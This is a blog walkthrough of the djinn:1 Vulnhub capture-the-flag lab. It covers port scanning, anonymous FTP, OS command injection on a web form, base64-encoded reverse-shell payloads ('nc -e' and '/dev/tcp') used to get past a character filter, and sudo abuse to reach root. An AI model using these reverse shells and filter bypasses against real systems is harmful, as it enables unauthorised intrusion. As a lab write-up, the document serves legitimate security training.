---
title: 'djinn:1 Vulnhub Walkthrough'
date: 2019-11-27T16:03:00+01:00
draft: false
---

Hello guys, today we will face an Intermediate challenge. Introducing the djinn: 1 virtual machine, created by “[0xmzfr](https://twitter.com/@0xmzfr)” and available on Vulnhub. This is another Capture the Flag Style Challenge where we have to escalate privileges to the “root user” and find 2 flags to complete the challenge.

Since these labs are available on the Vulnhub Website. We will be downloading the lab file from this [link](https://www.vulnhub.com/entry/djinn-1,397/).

### **Penetration Methodologies:**

*   Network Scanning
    *   Netdiscover
    *   Nmap Scan
*   Enumeration
    *   FTP Enumeration
    *   Browsing HTTP Service
    *   Netcat
    *   Directory Bruteforce using gobuster
    *   Discovering Command Injection
*   Exploitation
    *   Bypassing Command Injection Filter
    *   Getting Netcat Session
    *   Enumeration Files and Directories
*   Post Exploitation
    *   Reading the User Flag
    *   Getting Login Credentials
    *   Enumeration for Sudo Permissions
*   Privilege Escalation
    *   Abusing Sudo Rights
    *   Confirm Root Access
    *   Reading the Root Flag

### **Walkthrough**

### **Network Scanning**

The first step is to identify the target. So, to identify your target we will use the following command:

```
netdiscover
```

![](https://i1.wp.com/1.bp.blogspot.com/-A7nSA11WmDo/Xd6JAMXmYtI/AAAAAAAAhow/n3OvNA0bORkU6bFMwsqALei69I6xK2R9QCLcBGAsYHQ/s1600/1.png?w=687&ssl=1)

Now we will use Nmap to gain information about the open ports and the services running on the target machine using the command

```
nmap -p- 192.168.43.134
```

![](https://i0.wp.com/1.bp.blogspot.com/-IxcjQfwImWM/Xd6JDw6oaQI/AAAAAAAAhpc/RXfhZXaz89IBfQl0e1znc0T7jDOras4iACLcBGAsYHQ/s1600/2.png?w=687&ssl=1)

So as we can see that port 21/TCP is open so we can try for anonymous login to fetch some useful information.

### **Enumeration**

Yes! We are in! There are three files here namely creds, game and message.

```
ftp 192.168.43.134  
anonymous  
ls
```

![](https://i0.wp.com/1.bp.blogspot.com/-Z5lV2QwwnKs/Xd6JH24OfNI/AAAAAAAAhqI/6PzAIFtSUUwhhV-65INR60pb_tT3jAokACLcBGAsYHQ/s1600/3.png?w=687&ssl=1)

We can see let’s try to download these three files in our kali machine and try to read their content

Command used to download these files are:

```
get creds.txt  
get game.txt  
get message.txt
```

![](https://i1.wp.com/1.bp.blogspot.com/-5NdwkSuZpr0/Xd6JH5WpP9I/AAAAAAAAhqM/dx_sh3FyLNgMY0M-HqN-kAvIEQZr3Bt_ACLcBGAsYHQ/s1600/4.png?w=687&ssl=1)

We downloaded all three files in our Kali machine and now it’s time to see the content of these files using the command cat

```
cat creds.txt  
cat game.txt  
cat message.txt
```

![](https://i2.wp.com/1.bp.blogspot.com/-rBME39pLc50/Xd6JIKsclSI/AAAAAAAAhqQ/zga1_jCvpkEWWeMhNzQGTmyDbv_u2HiUgCLcBGAsYHQ/s1600/5.png?w=687&ssl=1)

So we have three things that seem to be useful for us, but SSH port is filtered so clearly these creds can’t be used to login via SSH. let’s note down these three highlighted parts in a file for future reference.

But according to the message.txt file, there is a game running on port 1337. let’s play the game.

```
http://192.168.43.134:1337
```

![](https://i2.wp.com/1.bp.blogspot.com/-S9Kx54UMFLY/Xd6JI-oCGbI/AAAAAAAAhqU/PKyH6F3ljP4-dNlwLT0P4M5GEwk6wUI9wCLcBGAsYHQ/s1600/6.png?w=687&ssl=1)

We get an error: This page isn’t working. So, in this case, we will use Netcat to make a connection so that we can play the game

```
nc 192.168.43.134 1337
```

![](https://i0.wp.com/1.bp.blogspot.com/-uDCxW0LlSe8/Xd6JJEvdY7I/AAAAAAAAhqY/bo4nC0iG-ToSatcGTAUifq3isQxMYx_OgCLcBGAsYHQ/s1600/7.png?w=687&ssl=1)

As we can see in the above image that we need to answer such simple maths question 1000 times and for sure we are not going to do that. The reason is: playing this game is time-consuming and we are not sure about after solving 1000 times is there any gift for us which will help us or it’s just some greeting message to boost up our confidence.

So without wasting our time let’s try another port that is 7331

```
http://192.168.43.134:7331
```

![](https://i0.wp.com/1.bp.blogspot.com/-nzKwPCnBtvU/Xd6JJJFg-2I/AAAAAAAAhqc/u0xcxmiT54INhztKdLVEOozdYEXRWumyACLcBGAsYHQ/s1600/8.png?w=687&ssl=1)

We don’t find anything useful. after checking the source code there is no information that can be used to login to any of the accounts in the targeted machine. So now we can think of directory buster, means it’s time to find some hidden directories and pages at this particular port. We used the gobuster tool for directory Bruteforce. This gave us two pages ‘/genie’ and’/wish’.

```
gobuster dir -u http://192.168.43.134:7331 -w /usr/share/wordlists/dirb/big.txt
```

![](https://i1.wp.com/1.bp.blogspot.com/-OlgSdMU9nZI/Xd6JJ25xNTI/AAAAAAAAhqg/Gzm0AjmWrB425YP97PTS50YDoHr4yLsiwCLcBGAsYHQ/s1600/9.png?w=687&ssl=1)

We opened the /genie page. It is showing an error that is ERROR 403. So this page might be of no use.

```
http://192.168.43.134:7331/genie
```

![](https://i1.wp.com/1.bp.blogspot.com/-gAg-gi2kqnY/Xd6JAFMXRAI/AAAAAAAAho0/PhLy46dUcvsvUNhZS8nSbdUskZb5ZmXJgCLcBGAsYHQ/s1600/10.png?w=687&ssl=1)

We open this another page named /wish. This contained text saying “Oh you found me then go on make a wish. This can make all your wishes come true.” Followed by a form input section and Submit button. This is absolutely interesting.

```
http://192.168.43.134:7331/wish
```

![](https://i0.wp.com/1.bp.blogspot.com/-V0L5i7fndds/Xd6JALIHNjI/AAAAAAAAho4/glU_d6JJdjQjmhiXuR4ftaobpG6P_bmcQCLcBGAsYHQ/s1600/11.png?w=687&ssl=1)

So it’s time to explore the /wish. As there is a form at this page so for a second we can think of OS command injection. Ok let’s try some common commands if we are going in the right direction or not

```
id
```

![](https://i0.wp.com/1.bp.blogspot.com/-M3UlXgMeoak/Xd6JBQufv8I/AAAAAAAAho8/6fOhuKztT2kPwWvgAVfYVLgiy7ddRTMzwCLcBGAsYHQ/s1600/12.png?w=687&ssl=1)

So the “id” command is executed successfully. It means we were right before. This is OS command injection and we can take advantage of this vulnerability to get a shell using Netcat.

Let’s do it!

![](https://i0.wp.com/1.bp.blogspot.com/-LmclBIk1sSc/Xd6JB1bK9CI/AAAAAAAAhpE/ZRE1WOGWSo0jq9MoNwI-F7vVQ83altWLwCLcBGAsYHQ/s1600/13.png?w=687&ssl=1)

### **Exploitation**

We started a Netcat listener on our Kali machine. Then we tried to invoke the Netcat shell from the Command Injection that we just found.

```
nc -nlvp 1234  
nc -e /bin/sh 192.168.43.249 1234
```

![](https://i0.wp.com/1.bp.blogspot.com/-Tq0VgVzEIc8/Xd6JBqgJvRI/AAAAAAAAhpA/rPRRTP4bthcXHvsiXaZPtIeC8b4UkmwCwCLcBGAsYHQ/s1600/14.png?w=687&ssl=1)

It gives a message: Wrong choice of words 

So after trying a lot of commands, we can conclude that some of the symbols are characters are restricted. if those characters are present in the command then the command is not going to be executed.

![](https://i1.wp.com/1.bp.blogspot.com/-Wh_kvXPQEvg/Xd6JCcprrMI/AAAAAAAAhpI/mmWRmQVyngc-Sv_LfSslLP3kpf_8IzyWACLcBGAsYHQ/s1600/15.png?w=687&ssl=1)

So after thinking a lot, we came up with a solution what if encrypt the whole command in base64 format because commands like “echo”,” base64 -d” and “bash” are working.

The website used to encrypt: https://ift.tt/2OPZVOP

```
nc -e /bin/sh 192.168.43.249 1234
```

Encoded command: bmMgLWUgL2Jpbi9zaCAxOTIuMTY4LjQzLjI0OSAxMjM0

So now we will use pipe (|) operator to make our work done!

After experimenting a lot with /wish page we came up with this command:

```
echo bmMgLWUgL2Jpbi9zaCAxOTIuMTY4LjQzLjI0OSAxMjM0 | base64 -d | bash
```

But our luck is not good, this doesn’t work. It gives no error but this command doesn’t give us the shell access either. Now it’s time to search for some other forms of commands to get a shell and we will try this:

```
bash -i >& /dev/tcp/192.168.43.249/8080 0>&1
```

So we encoded this command using the same website. So now we will try the below-written command in /wish page. Don’t forget to start the listener using the command shown below.

```
echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQzLjI0OS84MDgwIDA+JjE=
```

![](https://i0.wp.com/1.bp.blogspot.com/-B1SaXj0TfrQ/Xd6JCsedj7I/AAAAAAAAhpQ/VJD9RKhJzyMHbfBh-N8TNltM7fCeagq5ACLcBGAsYHQ/s1600/16.png?w=687&ssl=1)

We got the shell using this technique. We ran the command whoami to find the user of which we just got the shell. It came out to be www-data.

```
nc -nlvp 8080  
whoami
```

![](https://i0.wp.com/1.bp.blogspot.com/-GbUPt56d4B0/Xd6JCtwuDGI/AAAAAAAAhpM/kyAWAmrxX6wLs0zzJkK4NM2DA-0xGrQEQCLcBGAsYHQ/s1600/17.png?w=687&ssl=1)

We decided to look around the machine. We found a directory named 80 in the opt directory. We opened it. Here we find some files. We took at the app.py file. We found the path to a file named creds.txt. Let’s change the directory to the given directory and try to read the credentials.

```
ls  
cat app.py
```

![](https://i0.wp.com/1.bp.blogspot.com/-aVDSrAH8_ag/Xd6JDXL6coI/AAAAAAAAhpU/g4o6lvyT6CszCeK_t9DGWcZfY3AzSf8owCLcBGAsYHQ/s1600/18.png?w=687&ssl=1)

We navigated to the path mentioned in that file. We found the credential for the user nitish.

```
cd /home  
cd nitish/.dev/  
cat creds.txt
```

![](https://i0.wp.com/1.bp.blogspot.com/-msl22oXonyU/Xd6JDkZYQeI/AAAAAAAAhpY/gJn-feErW7g9Iu0_O_rpjj7tUyx_yDREQCLcBGAsYHQ/s1600/19.png?w=687&ssl=1)

We decided to login in as nitish. To do this we used the bash command. This invoked a bash shell, we converted that shell into a TTY shell using the python one-liner.

```
bash  
python -c 'import pty;pty.spawn("/bin/sh")'
```

![](https://i0.wp.com/1.bp.blogspot.com/-rZFS92g5ZkI/Xd6JET7c-TI/AAAAAAAAhpg/4_tMKeLt9MsKX0CNnV5PawtbCNQ5jcgCACLcBGAsYHQ/s1600/20.png?w=687&ssl=1)

We changed the user with the help of the su command. After entering the password that we found earlier we successfully logged in as nitish.

```
su nitish  
p4ssw0rdStr3t0n9  
whoami
```

![](https://i0.wp.com/1.bp.blogspot.com/-RJ4eeZRnn5I/Xd6JEkioUpI/AAAAAAAAhpk/nGj1K1-ZxIstvJhCekNv_DJsFdcwAtFsQCLcBGAsYHQ/s1600/21.png?w=687&ssl=1)

### **Post Exploitation**

Now that we reached a stage in out exploitation that we have the access of a user. We decided to look for the user flag that is hidden. We traversed into the nitish user home directory. Here we found the user.txt. This is the User Flag. Congratulations!! We found our first flag.

```
ls  
cd nitish  
ls  
cat user.txt
```

![](https://i0.wp.com/1.bp.blogspot.com/-RJ4eeZRnn5I/Xd6JEkioUpI/AAAAAAAAhpk/nGj1K1-ZxIstvJhCekNv_DJsFdcwAtFsQCLcBGAsYHQ/s1600/21.png?w=687&ssl=1)

Now it’s time to check for Sudo rights of the user nitish using the command:

```
sudo -l
```

![](https://i0.wp.com/1.bp.blogspot.com/-05-1bwvEXDo/Xd6JFrbsVBI/AAAAAAAAhpw/mKwgZsq0-QMaGDYmLX_jAuI7M5vVvDZkwCLcBGAsYHQ/s1600/23.png?w=687&ssl=1)

We found that the user nitish can execute the genie binary without any password for user sam.

As this is a custom user-generated script. We started tinkering it in order to understand the working of the script.

```
genie  
genie -h
```

![](https://i1.wp.com/1.bp.blogspot.com/--aO2-l5msJQ/Xd6JFhSSktI/AAAAAAAAhps/3fvhOY3qEF0laDJQ9PfNyWRWBoIldZuygCLcBGAsYHQ/s1600/24.png?w=687&ssl=1)

After messing around with this binary we successfully managed to get a shell of user sam using the command:

```
sudo -u sam genie -cmd new  
whoami
```

![](https://i0.wp.com/1.bp.blogspot.com/-4dWpNiG6Gls/Xd6JF44iFMI/AAAAAAAAhp0/aGHzZ488PrgCTkc3kzZZlo8RVr4D8EejQCLcBGAsYHQ/s1600/25.png?w=687&ssl=1)

Now we will try to get a stable shell using the command bash and after that, we will check for sudo rights for the user sam. We again tried to enumerate the Sudo Permissions. As we can see that we can execute the /root/lago as root so let’s do it!

```
bash  
sudo -l
```

![](https://i1.wp.com/1.bp.blogspot.com/-lnImK_ufx4M/Xd6JGTN7YvI/AAAAAAAAhp4/281J8wx2mwAt-Yv8QGw_PCssstZycn9ogCLcBGAsYHQ/s1600/26.png?w=687&ssl=1)

### **Privilege Escalation**

After trying a lot, we find a solution that it is possible if we can manage the correct number then we can get access to the root shell and yes we are right this time too. After multiple tried we enter the choice 2 and then type in “num” and successfully got a root shell.

```
sudo -u root /root/lago  
2  
num  
whoami
```

![](https://i2.wp.com/1.bp.blogspot.com/-Tm-fP-T15eM/Xd6JG5XMqPI/AAAAAAAAhp8/u9IP3oL0pRMWacqZ2Z-j4_1-pOmfVjqDACLcBGAsYHQ/s1600/27.png?w=687&ssl=1)

We used the bash command to get a proper shell of the root user. Now that we are the root user, we need to find the root flag. Instead of wandering here and there we decided to go to the root directory of the root user. Here, find a script named proof.sh.

```
bash  
su root  
cd  
ls
```

![](https://i2.wp.com/1.bp.blogspot.com/-0ZOMOZ7TnbM/Xd6JG_-b31I/AAAAAAAAhqA/icqLbGsUhpspPvWxy8CqXTSxa3bAxa3egCLcBGAsYHQ/s1600/28.png?w=687&ssl=1)

We ran the script, It gave us the final root flag that was needed to complete this CTF Challenge.

```
./proof.sh
```

![](https://i2.wp.com/1.bp.blogspot.com/-ki6CdSMPuMY/Xd6JHJyj2EI/AAAAAAAAhqE/MDAo1GzQxQIMfucLwtrokTwwEXlrI2E2QCLcBGAsYHQ/s1600/29.png?w=687&ssl=1)

**Author: Yash Saxena **an undergraduate student pursuing B. Tech in Computer science and engineering with a specialization in cybersecurity and forensics from DIT University, Dehradun.** Contact ****[here](https://www.linkedin.com/in/yash-saxena-412349161/)**.

The post [djinn:1 Vulnhub Walkthrough](https://www.hackingarticles.in/djinn1-vulnhub-walkthrough/) appeared first on [Hacking Articles](https://www.hackingarticles.in).

  
  
from Hacking Articles https://ift.tt/35Frilo